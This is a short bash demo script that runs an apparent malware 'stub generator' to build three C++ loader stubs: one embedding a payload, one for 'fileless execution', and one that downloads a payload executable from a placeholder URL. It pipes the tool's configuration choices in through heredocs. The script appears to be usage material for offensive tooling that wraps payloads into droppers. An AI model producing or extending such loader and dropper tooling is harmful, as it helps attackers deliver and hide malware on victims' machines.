#!/bin/bash

echo "=== Unified Stub Generator Demo ==="
echo ""

# 1. Embedded payload example
echo "1. Generating embedded payload stub..."
./unified_stub_generator test_payload embedded_stub.cpp
echo ""

# 2. Fileless execution example  
echo "2. Generating fileless execution stub..."
# Create input for interactive mode
cat << EOF | ./unified_stub_generator test_payload fileless_stub.cpp --config
2
y
y
1
y
n
y
y
n
y
y
y
EOF
echo ""

# 3. URL download example
echo "3. Generating URL download stub..."
# Create input for interactive mode
cat << EOF | ./unified_stub_generator --url url_stub.cpp --config
3
https://example.com/payload.exe
y
y
1
y
n
y
n
n
y
n
y
EOF
echo ""

echo "Demo complete! Generated stubs:"
ls -la embedded_stub.cpp fileless_stub.cpp url_stub.cpp 2>/dev/null || echo "Some stubs may have failed to generate"